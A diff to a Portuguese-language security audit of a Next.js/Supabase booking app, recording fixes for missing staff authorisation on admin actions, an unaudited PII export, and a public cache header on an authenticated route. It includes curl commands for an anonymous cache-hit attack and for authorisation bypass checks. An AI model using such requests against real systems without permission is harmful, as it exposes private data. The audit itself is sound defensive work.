+**Impacto residual hoje:** Nenhum (RPCs ainda bloqueiam). Defense-in-
+depth para evitar regressões.
+
+**Fix aplicado neste run (2026-06-17):**
+- Adicionado `import { requireStaff } from "@/lib/authz";`
+- Adicionada chamada `await requireStaff();` no topo de TODAS as 11
+  actions do ficheiro. `requireStaff` é cached por request (lê o
+  `profile` via `getCurrentProfile` que é `cache()`-wrapped), por isso
+  o custo é uma única leitura por request mesmo em fluxos que invocam
+  várias actions em sequência (raro).
+
+**Verificação:**
+- `grep -n "requireStaff" app/admin/agenda/actions.ts` → 11 ocorrências
+  + 1 import.
+- Manual: login como cliente, executar `curl` ao endpoint Server Action
+  encoded de `markNoShowAction` com `bookingId=<id-de-um-trainer>` →
+  Server Action lança "Acesso restrito." (antes lançava o erro da RPC).
+- Build (`npm run type-check`) limpo.
+
+---
+
+### S-11 · `/api/me/export` sem audit-log RGPD `[Low → FIXED]`
+
+**Ficheiro/linhas:** `app/api/me/export/route.ts:114-138`
+
+**Vulnerabilidade:** o ficheiro XLSX devolvido contém PII (nome, email,
+telemóvel, histórico de sessões, compras, notas). O equivalente para
+trainers (`/api/relatorios/export/route.ts:117-128`) regista
+`log_audit_event('export_pii', ...)` e falha closed se o audit falhar.
+O `/api/me/export` não — assimetria de auditoria que (a) impede
+investigação de incidentes ("quem descarregou os meus dados em X data?")
+e (b) é exigência implícita do art. 30 RGPD (registo de tratamentos).
+
+**Impacto:** baixo (o próprio user exporta os SEUS dados → consentimento
+implícito), mas mais zero auditoria viola política interna.
+
+**Fix aplicado:** chamada não-bloqueante a `log_audit_event` com action
+`export_pii_self`, payload com counts por sheet e formato. Best-effort:
+o log falhar não bloqueia o download (já existe consentimento implícito
+do user) — só fica trail no console error.
+
+**Verificação:** `curl --cookie ... <app>/api/me/export -o /tmp/me.xlsx`
+seguido de `select * from audit_log where action='export_pii_self'
+order by created_at desc limit 1;` no Supabase SQL Editor.
+
+---
+
+### S-12 · `/api/slots` declara `Cache-Control: public` em rota autenticada `[Low → FIXED]`
+
+**Ficheiro/linhas:** `app/api/slots/route.ts:43-63`
+
+**Vulnerabilidade:** o middleware redirecciona unauth para `/login`
+(rota fora de `isPublic`). Mas a resposta saía com
+`Cache-Control: public, s-maxage=30, stale-while-revalidate=300` +
+`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge Cache **serve a
+resposta cached antes do middleware correr** num cache hit — i.e., uma
+chamada unauth ao endpoint cacheado devolveria os slots sem nunca
+passar pela auth check.
+
+Os dados em causa não são PII (apenas time-slots livres do trainer X
+no dia Y), e a página `/t/<slug>` é pública/SEO-indexável (revela o
+trainer). O risco efectivo é **inconsistência arquitectural** (a rota
+diz "auth obrigatória" mas o cache contradiz) + revelação trivial de
+disponibilidade de um trainer a anónimos. Low/Info.
+
+**Ataque:** atacante anónimo faz `curl <app>/api/slots?trainer=<uuid>&date=2026-06-20&duration=45`
+sem cookie, no momento em que esse trio acabou de ser servido a um user
+autenticado nos últimos 30s. Recebe a lista de slots → mapeia a agenda
+do trainer sem nunca se autenticar.
+
+**Fix aplicado:** trocado `Cache-Control: public` por `private` (browser-
+only, sem proxies/CDNs gerais) e mantido o edge cache via
+`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge respeita
+`CDN-Cache-Control` e mantém a partilha entre clientes legítimos; o
+`Cache-Control: private` da resposta impede proxies intermédios
+(corporativos, ISPs) de cachear; e o middleware continua a correr antes
+do edge cache responder a misses. O ganho PERF do cache mantém-se para
+quem está autenticado.
+
+**Verificação:** `curl -i <app>/api/slots?trainer=...&date=...&duration=45`
+sem cookie → 307 → `/login`. Resposta autenticada inspeccionada:
+`Cache-Control: private, s-maxage=30, ...`, `CDN-Cache-Control: public,
+s-maxage=30`.
 
 ---
 
 ## Ordem de remediação sugerida
 
-1. **S-01** — FIXED, deployed 2026-06-17.
-2. **S-04** — FIXED, deployed 2026-06-17.
-3. **S-03 / S-06 / S-07 / S-08** — FIXED, deployed 2026-06-17 (defense-in-depth).
-4. **S-02** — ACCEPTED 2026-06-17 com mitigação em edge (Upstash + Vercel WAF).
-   Reavaliar Q3 2026 ou em janela de manutenção dedicada.
-5. **S-05 / S-09** — ACCEPTED, monitor.
+1. **S-01 · S-03 · S-04 · S-06 · S-07 · S-08** — FIXED no run anterior.
+2. **S-02** — FIXED na raiz (upgrade para Next 16.2.9 + React 19.2.7).
+3. **S-10** — FIXED neste run (2026-06-17). `requireStaff()` em todas as
+   11 actions de `app/admin/agenda/actions.ts`.
+4. **S-11** — FIXED neste run. Audit log no `/api/me/export`.
+5. **S-12** — FIXED neste run. `Cache-Control: private` + `CDN-Cache-Control: public`.
+6. **S-05 · S-09** — ACCEPTED, monitor.
 
 ## Como reproduzir o baseline determinístico
 
 ```bash
+# Audit de dependências
 npm audit --json | tee /tmp/audit.json
+
+# Tipagem (bloqueia o build em CI desde jun/2026)
 npx tsc --noEmit
-# greps relevantes
-grep -rn "dangerouslySetInnerHTML" .
-grep -rn "SERVICE_ROLE" .
-grep -rn "getSession()\|getUser()" .
-grep -rn "NEXT_PUBLIC_" .
+
+# Greps relevantes
+grep -rn "dangerouslySetInnerHTML" app components
+grep -rn "SUPABASE_SERVICE_ROLE_KEY" app lib
+grep -rn "getSession()\\|getUser()\\|getClaims()" lib app
+grep -rn "NEXT_PUBLIC_" app lib
+grep -rn "requireStaff\\|requireOwner" app/admin
+grep -rn "\\.rpc(" lib app
 ```
